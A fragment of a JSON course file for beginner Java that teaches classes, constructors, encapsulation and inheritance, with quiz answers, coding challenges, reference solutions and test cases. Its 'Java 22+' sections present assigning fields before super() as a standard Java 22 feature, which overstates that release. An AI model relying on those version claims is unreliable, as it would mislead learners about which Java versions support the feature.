              "difficulty": "beginner"
            },
            {
              "type": "MULTIPLE_CHOICE",
              "id": "git-lesson-4-mc-4",
              "title": "Forking",
              "description": "When do you fork a repository?",
              "question": "When would you typically fork a repository instead of just cloning it?",
              "options": [
                "When you want to work offline",
                "When you want to contribute to a project you don't have write access to",
                "When the repository is too large",
                "When you want to speed up git operations"
              ],
              "correctAnswer": 1,
              "explanation": "Forking creates your own copy of someone else's repository on GitHub. This is typically done when contributing to open source projects where you don't have direct write access. You fork, make changes, then create a pull request to propose your changes to the original project.",
              "difficulty": "beginner"
            }
          ]
        }
      ],
      "order": 3
    },
    {
      "id": "module-04",
      "title": "Object-Oriented Programming",
      "description": "Master OOP concepts: classes, objects, encapsulation, inheritance, polymorphism, records, and sealed classes.",
      "difficulty": "beginner",
      "estimatedHours": 4.4,
      "lessons": [
        {
          "id": "epoch-2-lesson-1",
          "title": "Lesson 4.1: Classes and Objects - The Blueprint",
          "moduleId": "module-04",
          "order": 1,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Managing Complex Data",
              "content": "Imagine you're building a student management system. Each student has:\n- name (String)\n- age (int)\n- gpa (double)\n- isEnrolled (boolean)\n\nFor 100 students, you'd need:\nString student1Name, student2Name, ...student100Name;\nint student1Age, student2Age, ...student100Age;\n// 400 variables total!\n\nThis is:\n❌ Impossible to manage\n❌ Error-prone (easy to mix up which age belongs to which student)\n❌ Can't use loops or methods effectively\n\nYou need a way to group related data together and create your OWN data types.\n\nThis is what CLASSES do!"
            },
            {
              "type": "KEY_POINT",
              "title": "Classes are Blueprints, Objects are Houses",
              "content": "Think of building houses:\n\nBLUEPRINT (Class):\n- Defines what a house HAS: rooms, doors, windows\n- Defines what a house DOES: open door, turn on lights\n- You can't live in a blueprint!\n\nACTUAL HOUSE (Object):\n- Built FROM the blueprint\n- Has actual values: 3 bedrooms, blue door, 5 windows\n- You can interact with it\n\nFrom ONE blueprint, you can build MANY houses, each with different colors, sizes, etc.\n\nIn Java:\n- Class = Blueprint (you define it once)\n- Object = Actual instance (you create many from the blueprint)\n\nclass Student { } // This is the blueprint\nStudent alice = new Student(); // This is an actual object"
            },
            {
              "type": "THEORY",
              "title": "Creating a Class",
              "content": "A class is a template for creating objects.\n\npublic class Student {\n    // FIELDS (data the object stores)\n    String name;\n    int age;\n    double gpa;\n    \n    // METHODS (what the object can do)\n    void study() {\n        System.out.println(name + \" is studying\");\n    }\n}\n\nBreaking it down:\n1. 'public class Student' - declares a new type called Student\n2. Fields (variables inside the class) - the data each student has\n3. Methods (functions inside the class) - actions a student can do\n\nCreating and using objects:\n\n// Create two student objects\nStudent alice = new Student();\nalice.name = \"Alice\";\nalice.age = 20;\nalice.gpa = 3.8;\n\nStudent bob = new Student();\nbob.name = \"Bob\";\nbob.age = 22;\nbob.gpa = 3.5;\n\n// Use the objects\nalice.study();  // Prints: Alice is studying\nbob.study();    // Prints: Bob is studying"
            },
            {
              "type": "KEY_POINT",
              "title": "Class vs Object - The Key Difference",
              "content": "CLASS:\n✓ A template/blueprint\n✓ Defined once\n✓ Describes structure and behavior\n✓ Example: 'Student' class\n\nOBJECT:\n✓ An instance created from the class\n✓ Created many times with 'new'\n✓ Has actual data values\n✓ Example: alice and bob are Student objects\n\nAnalogy:\nClass = Cookie cutter\nObject = Actual cookie\n\nYou use ONE cookie cutter to make MANY cookies."
            },
            {
              "type": "WARNING",
              "title": "Common Classes and Objects Pitfalls",
              "content": "COMMON MISTAKES TO AVOID:\n\n1. FORGETTING new KEYWORD:\n   Student alice;  // Only declares a variable (null)\n   alice.name = \"Alice\";  // NullPointerException!\n   CORRECT: Student alice = new Student();\n\n2. CONFUSING CLASS WITH OBJECT:\n   Student.name = \"Alice\";  // ERROR! Cannot access fields on the class\n   CORRECT: Student s = new Student(); s.name = \"Alice\";\n\n3. PUBLIC FIELDS (BAD PRACTICE):\n   Directly accessing fields like myCar.speed = -500 allows invalid data.\n   Use encapsulation (private fields + getters/setters) instead.\n\n4. FORGETTING TO INITIALIZE FIELDS:\n   Fields have default values (0, null, false), but relying on them causes bugs.\n   Always initialize fields explicitly via constructors.\n\n5. JAVA 16+ ALTERNATIVE - RECORDS:\n   For simple data classes, consider using records:\n   record Student(String name, int age) {}\n   Records auto-generate constructor, getters, equals, hashCode, toString."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-1-car",
              "title": "Create and Use Objects",
              "description": "A Car class is provided with fields: brand, year and a method honk().\n\nIn main:\n1. Create a Car object called 'myCar'\n2. Set myCar.brand = \"Toyota\"\n3. Set myCar.year = 2020\n4. Call myCar.honk()\n\nExpected output: Toyota goes beep!",
              "instructions": "A Car class is provided with fields: brand, year and a method honk().\n\nIn main:\n1. Create a Car object called 'myCar'\n2. Set myCar.brand = \"Toyota\"\n3. Set myCar.year = 2020\n4. Call myCar.honk()\n\nExpected output: Toyota goes beep!",
              "starterCode": "// Create and Use Objects\n// Write your code below\n\npublic class Solution {\n    public static void main(String[] args) {\n        \n    }\n}",
              "solution": "// Solution: Create and Use Objects\n// This demonstrates creating and using objects\n\n// Define the Car class with fields and methods\nclass Car {\n    String brand;\n    int year;\n    \n    // Method that uses the brand field\n    void honk() {\n        System.out.println(brand + \" goes beep!\");\n    }\n}\n\npublic class Solution {\n    public static void main(String[] args) {\n        // Step 1: Create a Car object\n        Car myCar = new Car();\n        \n        // Step 2: Set the brand field\n        myCar.brand = \"Toyota\";\n        \n        // Step 3: Set the year field\n        myCar.year = 2020;\n        \n        // Step 4: Call the honk method\n        myCar.honk();\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-1-car-test-1",
                  "description": "Should print Toyota goes beep!",
                  "expectedOutput": "Toyota goes beep!",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-2",
          "title": "Lesson 4.2: Constructors - Better Object Creation",
          "moduleId": "module-04",
          "order": 2,
          "estimatedMinutes": 30,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Tedious Object Setup",
              "content": "Creating objects the current way is tedious:\n\nStudent student = new Student();\nstudent.name = \"Alice\";\nstudent.age = 20;\nstudent.gpa = 3.8;\n\nFour lines just to create one student! And you might forget to set a field.\n\nWouldn't it be nice to write:\nStudent student = new Student(\"Alice\", 20, 3.8);\n\nThis is what CONSTRUCTORS allow!"
            },
            {
              "type": "THEORY",
              "title": "Constructor Syntax",
              "content": "A constructor is a special method that runs when you create an object.\n\npublic class Student {\n    String name;\n    int age;\n    double gpa;\n    \n    // Constructor\n    public Student(String name, int age, double gpa) {\n        this.name = name;\n        this.age = age;\n        this.gpa = gpa;\n    }\n}\n\nKey points:\n1. Constructor name MUST match class name\n2. No return type (not even void)\n3. 'this.name' refers to the field, 'name' refers to the parameter\n\nUsage:\nStudent alice = new Student(\"Alice\", 20, 3.8);"
            },
            {
              "type": "KEY_POINT",
              "title": "The 'this' Keyword",
              "content": "'this' refers to the current object.\n\nthis.name = name;\n  ↑          ↑\n field    parameter\n\nWithout 'this', Java gets confused about which 'name' you mean!"
            },
            {
              "type": "WARNING",
              "title": "Common Constructor Pitfalls",
              "content": "COMMON MISTAKES TO AVOID:\n\n1. ADDING RETURN TYPE:\n   public void Student(String name) { }  // This is a METHOD, not constructor!\n   CORRECT: public Student(String name) { }  // No return type\n\n2. FORGETTING this WITH SAME PARAMETER NAMES:\n   public Student(String name) {\n       name = name;  // Does NOTHING! Assigns parameter to itself\n   }\n   CORRECT: this.name = name;\n\n3. NOT CALLING super() IN SUBCLASS:\n   If parent has no default constructor, you MUST call super(...) first.\n\n4. CONSTRUCTOR CHAINING MISTAKES:\n   this(...) or super(...) must be the FIRST statement in constructor.\n\n5. JAVA 22+ FEATURE - STATEMENTS BEFORE super():\n   Java 22 allows statements before super() for validation/transformation.\n   Pre-Java 22: super() must always be first line.\n\n6. CONSIDER RECORDS FOR DATA CLASSES:\n   record Student(String name, int age) {}\n   Records generate canonical constructor, compact constructor validation."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-2-constructor",
              "title": "Create a Constructor",
              "description": "Add a constructor to the Book class that takes three parameters:\n- String title\n- String author\n- int pages\n\nUse 'this' to assign the parameters to the fields.\n\nExpected output: 1984 by Orwell",
              "instructions": "Add a constructor to the Book class that takes three parameters:\n- String title\n- String author\n- int pages\n\nUse 'this' to assign the parameters to the fields.\n\nExpected output: 1984 by Orwell",
              "starterCode": "// Create a Constructor\n// Write your code below\n\npublic class Solution {\n    public static void main(String[] args) {\n        \n    }\n}",
              "solution": "// Solution: Create a Constructor\n// This demonstrates using constructors to initialize objects\n\n// Book class with constructor\nclass Book {\n    String title;\n    String author;\n    int pages;\n    \n    // Constructor takes three parameters\n    // Uses 'this' to distinguish field from parameter\n    public Book(String title, String author, int pages) {\n        this.title = title;\n        this.author = author;\n        this.pages = pages;\n    }\n}\n\npublic class Solution {\n    public static void main(String[] args) {\n        // Create a book using the constructor\n        Book book = new Book(\"1984\", \"Orwell\", 328);\n        \n        // Print the formatted output\n        System.out.println(book.title + \" by \" + book.author);\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-2-constructor-test-1",
                  "description": "Should create book and display it",
                  "expectedOutput": "1984 by Orwell",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-3",
          "title": "Lesson 4.3: Encapsulation - Protecting Your Data",
          "moduleId": "module-04",
          "order": 3,
          "estimatedMinutes": 35,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Anyone Can Mess With Your Objects",
              "content": "Remember our Car class?\n\nclass Car {\n    String model;\n    int speed;\n}\n\nWhat if someone does this?\n\nCar myCar = new Car();\nmyCar.speed = -500;  // Negative speed?!\nmyCar.speed = 999999;  // Impossible speed!\n\nRight now, ANYONE can directly change our object's fields to nonsensical values.\nWe need CONTROL over how our data gets accessed and modified.\n\nThis is where ENCAPSULATION comes in."
            },
            {
              "type": "KEY_POINT",
              "title": "Encapsulation is Like a Bank Account",
              "content": "WITHOUT ENCAPSULATION:\n= Money sitting in a box on your desk\n- Anyone can take money out\n- Anyone can add fake money\n- No security or validation\n\nWITH ENCAPSULATION:\n= Money in a bank account\n- You can't directly touch the money\n- Must use deposit() method (validates amount)\n- Must use withdraw() method (checks balance)\n- Bank controls access and enforces rules\n\nIn Java:\n- Fields = private (like money in vault)\n- Methods = public (like bank teller window)\n- Methods validate before changing fields"
            },
            {
              "type": "THEORY",
              "title": "Access Modifiers: public, private, protected",
              "content": "Java has keywords that control WHO can access your code:\n\n1. PUBLIC - Anyone can access\n   public int speed;  // Any code anywhere can read/write\n\n2. PRIVATE - Only THIS class can access\n   private int speed;  // Only methods inside Car can access\n\n3. PROTECTED - This class + subclasses (we'll learn later)\n\n4. DEFAULT (no keyword) - Same package only\n\nBEST PRACTICE:\n- Fields: ALWAYS private\n- Methods: public if others need them, private if internal only"
            },
            {
              "type": "THEORY",
              "title": "Getters and Setters: Controlled Access",
              "content": "Instead of public fields, use private fields + public methods:\n\nclass Car {\n    private int speed;  // Hidden from outside\n    \n    // GETTER - Read the value\n    public int getSpeed() {\n        return speed;\n    }\n    \n    // SETTER - Change the value (with validation!)\n    public void setSpeed(int newSpeed) {\n        if (newSpeed >= 0 && newSpeed <= 200) {\n            speed = newSpeed;\n        } else {\n            System.out.println(\"Invalid speed!\");\n        }\n    }\n}\n\nNow:\nCar myCar = new Car();\nmyCar.speed = -500;  // COMPILE ERROR! speed is private\nmyCar.setSpeed(-500);  // Prints \"Invalid speed!\", doesn't change\nmyCar.setSpeed(60);  // Works! Sets speed to 60\nSystem.out.println(myCar.getSpeed());  // 60"
            },
            {
              "type": "KEY_POINT",
              "title": "Why Encapsulation Matters",
              "content": "1. DATA VALIDATION\n   - Prevent invalid states (negative speed, empty names)\n   - Enforce business rules\n\n2. FLEXIBILITY\n   - Change internal implementation without breaking other code\n   - Example: Change from int to double, only modify inside class\n\n3. DEBUGGING\n   - Put breakpoints in setters to find who's changing data\n   - Add logging to track changes\n\n4. SECURITY\n   - Hide sensitive data\n   - Control who can modify critical fields\n\nProfessional code ALWAYS uses encapsulation!"
            },
            {
              "type": "WARNING",
              "title": "Common Encapsulation Pitfalls",
              "content": "COMMON MISTAKES TO AVOID:\n\n1. EXPOSING MUTABLE OBJECTS:\n   private List<String> items;\n   public List<String> getItems() { return items; }  // BAD!\n   Caller can modify your internal list!\n   CORRECT: return new ArrayList<>(items);  // Return a copy\n\n2. SETTERS FOR EVERYTHING (ANEMIC CLASSES):\n   Auto-generating all getters/setters defeats encapsulation.\n   Only expose what is truly needed. Prefer behavior methods.\n\n3. BREAKING IMMUTABILITY WITH ARRAYS:\n   private int[] scores;\n   public int[] getScores() { return scores; }  // BAD!\n   CORRECT: return Arrays.copyOf(scores, scores.length);\n\n4. FORGETTING VALIDATION IN CONSTRUCTORS:\n   Validate in constructor too, not just setters.\n   new BankAccount(-1000);  // Should this work?\n\n5. JAVA 16+ ALTERNATIVE - RECORDS:\n   Records are immutable by default with automatic encapsulation:\n   record Account(double balance) {}\n   Fields are final, only getters (no setters), perfect for DTOs.\n\n6. FRAMEWORK REQUIREMENTS:\n   Some frameworks (Hibernate, Spring) need getters/setters.\n   Use records for DTOs, traditional classes for JPA entities."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-3-bank",
              "title": "Create Encapsulated BankAccount",
              "description": "Create a BankAccount class with:\n- private field: balance (double)\n- constructor that sets initial balance\n- getBalance() method\n- deposit(double amount) method (only if amount > 0)\n- withdraw(double amount) method (only if amount > 0 and balance sufficient)",
              "instructions": "Create a BankAccount class with:\n- private field: balance (double)\n- constructor that sets initial balance\n- getBalance() method\n- deposit(double amount) method (only if amount > 0)\n- withdraw(double amount) method (only if amount > 0 and balance sufficient)",
              "starterCode": "public class BankAccount {\n    // Add private field here\n    \n    // Add constructor\n    \n    // Add getBalance method\n    \n    // Add deposit method\n    \n    // Add withdraw method\n    \n}",
              "solution": "// Solution: Create Encapsulated BankAccount\n// This demonstrates encapsulation with private fields and public methods\n\npublic class BankAccount {\n    // Private field - cannot be accessed directly from outside\n    private double balance;\n    \n    // Constructor to set initial balance\n    public BankAccount(double initialBalance) {\n        this.balance = initialBalance;\n    }\n    \n    // Getter method - controlled read access\n    public double getBalance() {\n        return balance;\n    }\n    \n    // Deposit method with validation\n    public void deposit(double amount) {\n        // Only deposit if amount is positive\n        if (amount > 0) {\n            balance += amount;\n        }\n    }\n    \n    // Withdraw method with validation\n    public void withdraw(double amount) {\n        // Only withdraw if amount is positive AND sufficient balance\n        if (amount > 0 && balance >= amount) {\n            balance -= amount;\n        }\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-3-bank-test-1",
                  "description": "BankAccount acc = new BankAccount(100.0);\nreturn acc.getBalance();",
                  "expectedOutput": "100.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-bank-test-2",
                  "description": "BankAccount acc = new BankAccount(100.0);\nacc.deposit(50.0);\nreturn acc.getBalance();",
                  "expectedOutput": "150.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-bank-test-3",
                  "description": "BankAccount acc = new BankAccount(100.0);\nacc.withdraw(30.0);\nreturn acc.getBalance();",
                  "expectedOutput": "70.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-bank-test-4",
                  "description": "BankAccount acc = new BankAccount(100.0);\nacc.withdraw(200.0);\nreturn acc.getBalance();",
                  "expectedOutput": "100.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-bank-test-5",
                  "description": "BankAccount acc = new BankAccount(100.0);\nacc.deposit(-50.0);\nreturn acc.getBalance();",
                  "expectedOutput": "100.0",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-3-student",
              "title": "Create Encapsulated Student",
              "description": "Create a Student class with:\n- private fields: name (String), grade (int)\n- constructor\n- getName() and getGrade() methods\n- setGrade(int g) that only accepts grades 0-100",
              "instructions": "Create a Student class with:\n- private fields: name (String), grade (int)\n- constructor\n- getName() and getGrade() methods\n- setGrade(int g) that only accepts grades 0-100",
              "starterCode": "public class Student {\n    // Your code here\n}",
              "solution": "// Solution: Create Encapsulated Student\n// This demonstrates encapsulation with validation in setters\n\npublic class Student {\n    // Private fields\n    private String name;\n    private int grade;\n    \n    // Constructor\n    public Student(String name, int grade) {\n        this.name = name;\n        // Validate grade in constructor too\n        if (grade >= 0 && grade <= 100) {\n            this.grade = grade;\n        }\n    }\n    \n    // Getter for name\n    public String getName() {\n        return name;\n    }\n    \n    // Getter for grade\n    public int getGrade() {\n        return grade;\n    }\n    \n    // Setter for grade with validation (0-100 only)\n    public void setGrade(int g) {\n        if (g >= 0 && g <= 100) {\n            this.grade = g;\n        }\n        // If invalid, grade remains unchanged\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-3-student-test-1",
                  "description": "Student s = new Student(\"Alice\", 85);\nreturn s.getName();",
                  "expectedOutput": "Alice",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-student-test-2",
                  "description": "Student s = new Student(\"Bob\", 90);\nreturn s.getGrade();",
                  "expectedOutput": "90",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-student-test-3",
                  "description": "Student s = new Student(\"Carol\", 80);\ns.setGrade(95);\nreturn s.getGrade();",
                  "expectedOutput": "95",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-student-test-4",
                  "description": "Student s = new Student(\"Dave\", 75);\ns.setGrade(150);\nreturn s.getGrade();",
                  "expectedOutput": "75",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-3-product",
              "title": "Product with Validation",
              "description": "Create a Product class with:\n- private fields: name (String), price (double)\n- constructor\n- getName() and getPrice() methods\n- setPrice(double p) that only accepts prices > 0",
              "instructions": "Create a Product class with:\n- private fields: name (String), price (double)\n- constructor\n- getName() and getPrice() methods\n- setPrice(double p) that only accepts prices > 0",
              "starterCode": "public class Product {\n    // Your code here\n}",
              "solution": "// Solution: Product with Validation\n// This demonstrates encapsulation with price validation\n\npublic class Product {\n    // Private fields\n    private String name;\n    private double price;\n    \n    // Constructor\n    public Product(String name, double price) {\n        this.name = name;\n        // Only set price if positive\n        if (price > 0) {\n            this.price = price;\n        }\n    }\n    \n    // Getter for name\n    public String getName() {\n        return name;\n    }\n    \n    // Getter for price\n    public double getPrice() {\n        return price;\n    }\n    \n    // Setter for price with validation (must be > 0)\n    public void setPrice(double p) {\n        if (p > 0) {\n            this.price = p;\n        }\n        // If invalid, price remains unchanged\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-3-product-test-1",
                  "description": "Product p = new Product(\"Laptop\", 999.99);\nreturn p.getName() + \"-\" + p.getPrice();",
                  "expectedOutput": "Laptop-999.99",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-product-test-2",
                  "description": "Product p = new Product(\"Mouse\", 25.0);\np.setPrice(30.0);\nreturn p.getPrice();",
                  "expectedOutput": "30.0",
                  "isVisible": true
                },
                {
                  "id": "epoch-2-lesson-3-product-test-3",
                  "description": "Product p = new Product(\"Keyboard\", 50.0);\np.setPrice(-10.0);\nreturn p.getPrice();",
                  "expectedOutput": "50.0",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 2,
                  "text": "Define a function using the java syntax. Don't forget the return statement if needed."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-2-lesson-4",
          "title": "Lesson 4.4: Inheritance - Building on Existing Classes",
          "moduleId": "module-04",
          "order": 4,
          "estimatedMinutes": 40,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Duplicate Code Everywhere",
              "content": "Imagine you need these classes:\n\nclass Dog {\n    String name;\n    int age;\n    void eat() { System.out.println(\"Eating...\"); }\n    void sleep() { System.out.println(\"Sleeping...\"); }\n    void bark() { System.out.println(\"Woof!\"); }\n}\n\nclass Cat {\n    String name;  // DUPLICATE!\n    int age;  // DUPLICATE!\n    void eat() { System.out.println(\"Eating...\"); }  // DUPLICATE!\n    void sleep() { System.out.println(\"Sleeping...\"); }  // DUPLICATE!\n    void meow() { System.out.println(\"Meow!\"); }\n}\n\nThis is HORRIBLE:\n- Repeated code (name, age, eat, sleep)\n- If you change eat(), must change in BOTH places\n- Hard to maintain\n\nSolution: INHERITANCE - share common code!"
            },
            {
              "type": "KEY_POINT",
              "title": "Inheritance is Like Family Traits",
              "content": "BIOLOGICAL INHERITANCE:\n- Your parents have: eyes, hair, height genes\n- YOU inherit: eyes, hair, height from them\n- You also have: your own unique features\n\nJAVA INHERITANCE:\nclass Animal {  // PARENT (superclass)\n    String name;\n    void eat() { ... }\n    void sleep() { ... }\n}\n\nclass Dog extends Animal {  // CHILD (subclass)\n    // Automatically has: name, eat(), sleep()\n    void bark() { ... }  // PLUS its own method\n}\n\nDog d = new Dog();\nd.eat();  // From Animal\nd.sleep();  // From Animal\nd.bark();  // Dog's own method"
            },
            {
              "type": "THEORY",
              "title": "The 'extends' Keyword",
              "content": "SYNTAX:\nclass ChildClass extends ParentClass { ... }\n\nEXAMPLE:\nclass Animal {\n    protected String name;  // 'protected' = accessible to subclasses\n    protected int age;\n    \n    public Animal(String name, int age) {\n        this.name = name;\n        this.age = age;\n    }\n    \n    public void eat() {\n        System.out.println(name + \" is eating.\");\n    }\n}\n\nclass Dog extends Animal {\n    public Dog(String name, int age) {\n        super(name, age);  // Call parent constructor\n    }\n    \n    public void bark() {\n        System.out.println(name + \" says Woof!\");  // Can use 'name'\n    }\n}\n\nUsage:\nDog myDog = new Dog(\"Buddy\", 3);\nmyDog.eat();  // From Animal: \"Buddy is eating.\"\nmyDog.bark();  // From Dog: \"Buddy says Woof!\""
            },
            {
              "type": "THEORY",
              "title": "The 'super' Keyword",
              "content": "'super' refers to the PARENT class:\n\n1. CALLING PARENT CONSTRUCTOR:\n   public Dog(String name, int age) {\n       super(name, age);  // Must be FIRST line\n   }\n\n2. CALLING PARENT METHOD:\n   public void eat() {\n       super.eat();  // Call Animal's eat() first\n       System.out.println(\"Dog is satisfied.\");\n   }\n\n3. ACCESSING PARENT FIELD:\n   System.out.println(super.name);  // Usually just use 'name'\n\nNOTE: If you don't call super(...) explicitly, Java tries to call\nthe parent's no-argument constructor automatically."
            },
            {
              "type": "KEY_POINT",
              "title": "Flexible Constructor Bodies (Java 22+)",
              "content": "Java 22+ allows initializing fields BEFORE calling super():\n\n// Pre-Java 22 - had to call super() first\nclass Child extends Parent {\n    final int computed;\n    Child(int x) {\n        super();  // Must be first!\n        this.computed = x * 2;\n    }\n}\n\n// Java 22+ - can initialize before super()\nclass Child extends Parent {\n    final int computed;\n    Child(int x) {\n        this.computed = x * 2;  // Initialize first!\n        super();\n    }\n}\n\nThis enables:\n- Validate/transform arguments before passing to parent\n- Initialize final fields with computed values\n- Write cleaner constructor logic"
            },
            {
              "type": "KEY_POINT",
              "title": "Inheritance Best Practices",
              "content": "1. IS-A RELATIONSHIP:\n   - Dog IS-A Animal ✓ (inheritance makes sense)\n   - Car IS-A Engine ✗ (Car HAS-A Engine, use composition instead)\n\n2. INHERITANCE HIERARCHY:\n   Object (built-in Java class)\n     ↑\n   Animal\n     ↑\n   Dog, Cat, Bird (all extend Animal)\n\n3. EVERYTHING EXTENDS Object:\n   - Every Java class automatically extends Object\n   - Object provides: toString(), equals(), hashCode()\n\n4. SINGLE INHERITANCE ONLY:\n   - Java: class Dog extends Animal (ONE parent only)\n   - Multiple inheritance causes problems (diamond problem)\n   - Use interfaces for multiple \"contracts\" (later lesson)"
            },
            {
              "type": "WARNING",
              "title": "Common Inheritance Pitfalls",
              "content": "COMMON MISTAKES TO AVOID:\n\n1. INHERITANCE FOR CODE REUSE ONLY:\n   Stack extends Vector // BAD! Stack is NOT a Vector\n   Prefer composition: class Stack { private List items; }\n\n2. DEEP INHERITANCE HIERARCHIES:\n   A -> B -> C -> D -> E  // Too deep! Hard to maintain\n   Keep hierarchies shallow (2-3 levels max).\n\n3. BREAKING PARENT CONTRACT:\n   Override methods must honor parent behavior expectations.\n   Violating Liskov Substitution Principle causes bugs.\n\n4. FORGETTING super() CALL:\n   If parent has no default constructor, must call super(...) explicitly.\n   Java 22+ allows statements before super() for validation.\n\n5. JAVA 17+ SEALED CLASSES:\n   sealed class Shape permits Circle, Square {}\n   Controls exactly which classes can extend yours.\n   Enables exhaustive pattern matching in switch.\n\n6. PREFER COMPOSITION OVER INHERITANCE:\n   Composition is more flexible and avoids tight coupling.\n   Use inheritance only for true IS-A relationships."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-2-lesson-4-vehicle",
              "title": "Create Vehicle Hierarchy",
              "description": "Create:\n1. Vehicle class with: String brand, int year, and method getInfo() that returns \"brand (year)\"\n2. Car class that extends Vehicle and adds: int doors field\n   Constructor should accept brand, year, and doors",
              "instructions": "Create:\n1. Vehicle class with: String brand, int year, and method getInfo() that returns \"brand (year)\"\n2. Car class that extends Vehicle and adds: int doors field\n   Constructor should accept brand, year, and doors",
              "starterCode": "class Vehicle {\n    // Your code here\n}\n\nclass Car extends Vehicle {\n    // Your code here\n}",
              "solution": "// Solution: Create Vehicle Hierarchy\n// This demonstrates inheritance with extends and super\n\nclass Vehicle {\n    String brand;\n    int year;\n    \n    // Constructor\n    public Vehicle(String brand, int year) {\n        this.brand = brand;\n        this.year = year;\n    }\n    \n    // Method to get vehicle info\n    public String getInfo() {\n        return brand + \" (\" + year + \")\";\n    }\n}\n\nclass Car extends Vehicle {\n    int doors;\n    \n    // Constructor calls super to initialize parent fields\n    public Car(String brand, int year, int doors) {\n        super(brand, year);  // Call Vehicle constructor\n        this.doors = doors;\n    }\n    // Car inherits getInfo() from Vehicle automatically\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-2-lesson-4-vehicle-test-1",
                  "description": "Vehicle v = new Vehicle(\"Generic\", 2020);\nreturn v.getInfo();",
                  "expectedOutput": "Generic (2020)",
                  "isVisible": true
                },
                {
